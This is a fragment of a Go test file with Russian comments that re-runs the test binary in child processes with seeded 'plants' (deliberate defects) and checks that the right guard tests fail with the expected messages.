func plantedExtraFiles(t *testing.T) []string {
	t.Helper()
	if p := activePlant(t); p != nil {
		return p.extraFiles
	}
	return nil
}

var failLineRe = regexp.MustCompile(`(?m)^\s*--- FAIL: (Test[A-Za-z0-9_]+)`)
var passLineRe = regexp.MustCompile(`(?m)^\s*--- PASS: (Test[A-Za-z0-9_]+)`)

func runChild(plantName string) (string, error) {
	cmd := exec.Command(os.Args[0], "-test.run", "^Test", "-test.skip", "^TestCanary", "-test.count=1", "-test.v")
	cmd.Env = append(os.Environ(), plantEnv+"="+plantName)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// logLineRe — начало сообщения testing: «    файл.go:NN: текст».
var logLineRe = regexp.MustCompile(`^\s+[A-Za-z0-9_]+\.go:\d+: `)

// failBlocks — сообщения с меткой failMark вместе с их продолжением
// (строки продолжения testing печатает с дополнительным отступом, до
// следующего сообщения или строки ===/---). Текст t.Logf сюда не попадает.
func failBlocks(out string) []string {
	var blocks []string
	cur, in := "", false
	for _, l := range strings.Split(out, "\n") {
		trim := strings.TrimSpace(l)
		switch {
		case logLineRe.MatchString(l):
			if in {
				blocks = append(blocks, cur)
			}
			in = strings.Contains(l, ": "+failMark)
			cur = l
		case strings.HasPrefix(trim, "---") || strings.HasPrefix(trim, "===") || trim == "FAIL" || trim == "PASS":
			if in {
				blocks = append(blocks, cur)
			}
			in = false
		default:
			if in {
				cur += "\n" + l
			}
		}
	}
	if in {
		blocks = append(blocks, cur)
	}
	return blocks
}

func uniqSorted(ms [][]string) []string {
	set := map[string]bool{}
	for _, m := range ms {
		set[m[1]] = true
	}
	var out []string
	for k := range set {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}

func TestCanaryPlantsReachMainTests(t *testing.T) {
	if os.Getenv(plantEnv) != "" {
		t.Skip("дочерний процесс канарейки")
	}
	want := append([]string{}, mainTests...)
	sort.Strings(want)

	clean, err := runChild("нет")
	passed := uniqSorted(passLineRe.FindAllStringSubmatch(clean, -1))
	if err != nil || strings.Join(passed, " ") != strings.Join(want, " ") {
		t.Fatalf("без подсадки не все сторожа прошли или не все нашлись (err=%v)\n  прошли: %v\n  ждали:  %v\n%s",
			err, passed, want, clean)
	}

	for _, p := range plants {
		t.Run(p.name, func(t *testing.T) {
			t.Parallel() // дочерние процессы независимы; без этого прогон — минута
			out, err := runChild(p.name)
			failed := uniqSorted(failLineRe.FindAllStringSubmatch(out, -1))
			wantFailed := append([]string{p.wantTest}, p.also...)
			sort.Strings(wantFailed)
			blocks := failBlocks(out)
			hit := ""
			for _, b := range blocks {
				if strings.Contains(b, p.wantMsg) {
					hit = b
					break
				}
			}
			if err == nil || strings.Join(failed, " ") != strings.Join(wantFailed, " ") || hit == "" {
				t.Errorf("подсадка %s: ждали провала ровно %v с «%s» в блоке с меткой %q (err=%v), упали: %v\n%s",
					p.name, wantFailed, p.wantMsg, failMark, err, failed, out)
				return
			}
			t.Log("ДОЧЕРНИЙ: " + strings.TrimSpace(strings.SplitN(hit, "\n", 2)[0]))
		})
	}
}
